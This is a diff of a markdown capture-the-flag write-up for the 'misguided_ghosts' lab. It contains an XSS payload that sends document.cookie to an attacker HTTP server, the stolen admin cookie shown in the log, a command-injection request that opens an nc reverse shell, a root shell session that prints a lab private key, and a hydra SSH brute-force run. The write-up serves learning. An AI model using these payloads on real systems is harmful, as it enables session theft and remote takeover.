@@ -41,7 +41,7 @@ PORT     STATE    SERVICE    VERSION
 8080/tcp filtered http-proxy
 ```
 
-<h2>/ftp</h2>
+<h2>FTP</h2>
 
 ```bash
 :~# ftp xx.xxx.xxx.xx
@@ -89,7 +89,7 @@ ftp> exit
 221 Goodbye.
 ```
 
-<h2>info.txt</h2>
+<h3>info.txt</h3>
 
 ```bash
 :~# cat info.txt
@@ -98,7 +98,7 @@ I have included all the network info you requested, along with some of my favour
 - Paramore
 ```
 
-<h2>jokes.txt</h2>
+<h3>jokes.txt</h3>
 
 ```bash
 :~# cat jokes.txt
@@ -115,7 +115,7 @@ Taylor: Adore who?
 Josh:   Adore is between you and I so please open up!
 ```
 
-<h2>traces.pcapng</h2>
+<h3>traces.pcapng</h3>
 <p>
 
 - 7864<br>
@@ -128,7 +128,7 @@ Josh:   Adore is between you and I so please open up!
 
 <br>
 <br>
-<h2>knock</h2>
+<h3>knock</h3>
 
 ```bash
 :~# apt install knockd
@@ -257,8 +257,6 @@ https://misguided_ghosts.thm:8080/login                (Status: 200) [Size: 761]
 
 <br>
 <br>
-
-
 <h2>gobuster</h2>
 
 ```bash
@@ -276,13 +274,22 @@ https://misguided_ghosts.thm:8080/photos               (Status: 200) [Size: 629]
 
 <img width="1040" height="112" alt="image" src="https://github.com/user-attachments/assets/99193bee-7f4b-45b6-ba17-0479e0f7c504" />
 
+<br>
+<br>
+<h3>Title:</h3>
 
-<p>Title:</p>
+```bash
+:~# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
 
 ```bash
 &lt;sscriptcript&gt;var i = new Image();i.src = "http://xx.xxx.xx.xx:8000/" + document.cookie;&lt;/sscriptcript&gt;
 ```
 
+<p>
+
+- hayley_is_admin</p>
 
 ```bash
 :~# python3 -m http.server
@@ -291,24 +298,26 @@ xx.xxx.xxx.xx - - [15/Sep/2025 xx:xx:xx] code 404, message File not found
 xx.xxx.xxx.xx - - [15/Sep/2025 xx:xx:xx] "GET /login=hayley_is_admin HTTP/1.1" 404 -
 ```
 
-
 <img width="941" height="133" alt="image" src="https://github.com/user-attachments/assets/24e07d97-c835-4018-83a2-0196a54b3a2c" />
 
 <br>
 <br>
-
 
 <img width="1047" height="215" alt="image" src="https://github.com/user-attachments/assets/5b85ea23-ad43-4adb-a835-c73288daba85" />
 
 <br>
 <br>
 
-
 <img width="1057" height="462" alt="image" src="https://github.com/user-attachments/assets/e3c852ea-7a80-4049-8199-7ad426b8cc28" />
 
 
 <br>
 <br>
+
+```bash
+:~# nc -nlvp 9001
+Listening on 0.0.0.0 9001
+```
 
 ```bash
 GET /photos?image=image=.;nc${IFS}xx.xxx.xx.xx{IFS}9001${IFS}-e${IFS}/bin/sh HTTP/1.1
@@ -334,7 +343,13 @@ Listening on 0.0.0.0 9001
 Connection received on xx.xxx.xxx.xx 42125
 id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+```bash
 which python3
+```
+
+```bash
 ls
 Dockerfile
 app.py
@@ -345,28 +360,43 @@ start.sh
 static
 stop.sh
 templates
+```
+
+```bash
 cd /home/zac
-ls
-notes
-cat notes
+```
+
+```bash
 ls -lah
 total 12K    
 drwxr-xr-x    3 root     root        4.0K Sep 15 00:58 .
 drwxr-xr-x    1 root     root        4.0K Sep 15 00:58 ..
 drwxrwxr-x    2 1001     1001        4.0K Aug 26  2020 notes
+```
+
+```bash
 cd notes
+```
+
+```bash
 ls -lah
 total 16K    
 drwxrwxr-x    2 1001     1001        4.0K Aug 26  2020 .
 drwxr-xr-x    3 root     root        4.0K Sep 15 00:58 ..
 -rw-r--r--    1 1001     1002        1.6K Aug 25  2020 .id_rsa
 -rw-r--r--    1 1001     1002         270 Aug 25  2020 .secret
+```
+
+```bash
 cat .secret
 Zac,
 
 I know you can never remember your password, so I left your private key here so you don't have to use a password. I ciphered it in case we suffer another hack, but I know you remember how to get the key to the cipher if you can't remember that either.
 
 - Paramore
+```
+
+```bash
 cat .id_rsa
 -----BEGIN RSA PRIVATE KEY-----
 NCBXsnNMYBEVTUVFawb9f8f0vbwLpvf0hfa1PYy0C91sYIG/U5Ss15fDbm2HmHdS
@@ -395,9 +425,9 @@ eXU3MNVuPeDrqdjYGg+4xXtSaLwSbOmGwH/aED2j4xxgraMo3Bp+raHGmOEex/RL
 r8WpMKfgl3+jWta+es1oL6DtD9y7RD5u9RPSXGNt/3QwNu+xNlle39laa8UZayPI
 VhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj
 -----END RSA PRIVATE KEY-----
+```
 
-
-
+```bash
 cd /app
 ls -lah
 total 56K    
@@ -415,6 +445,13 @@ drwxr-xr-x    8 root     root        4.0K Aug 11  2020 .git
 drwxr-xr-x    5 root     root        4.0K Aug 28  2020 static
 -rwxr-xr-x    1 root     root          92 Aug 26  2020 stop.sh
 drwxr-xr-x    2 root     root        4.0K Aug 28  2020 templates
+```
+
+<p>
+
+- docker</p>
+
+```bash
 cat start.sh
 #!/bin/bash
 
@@ -423,12 +460,13 @@ cat start.sh
 /usr/bin/docker container run --detach --privileged --restart=unless-stopped -p 8080:8080 --mount type=bind,source="/home/zac/notes",target=/home/zac/notes https
 ```
 
+<h2>hayley´s password</h2>
 
 ```bash
 :~# hydra -l hayley -P pass ssh://xx.xxx.xxx.xx
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-15 03:34:36
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-15 xx:xx:xx
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task
 [DATA] attacking ssh://xx.xxx.xxx.xx:22/
@@ -439,6 +477,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-15 03:34:
 [ERROR] 0 targets did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-15 xx3xx:xx
 ```
+
+<h2>SSH hayley</h2>
 
 ```bash
 :~# ssh hayley@xx.xxx.xxx.xx
